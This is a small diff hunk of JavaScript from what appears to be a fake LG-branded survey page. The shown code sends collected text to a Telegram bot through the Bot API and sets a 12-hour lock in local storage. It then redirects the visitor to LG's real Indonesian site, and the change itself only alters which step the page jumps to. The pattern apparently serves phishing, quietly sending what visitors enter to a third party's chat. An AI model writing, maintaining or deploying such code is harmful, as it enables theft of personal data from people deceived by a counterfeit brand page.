@@ -265,7 +265,7 @@
         fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
         .finally(() => {
             localStorage.setItem('lg_survey_lock', new Date().getTime() + (12 * 60 * 60 * 1000));
-            goTo(7);
+            goTo(21);
             setTimeout(() => { window.location.href = "https://www.lg.com/id"; }, 2500);
         });
     }
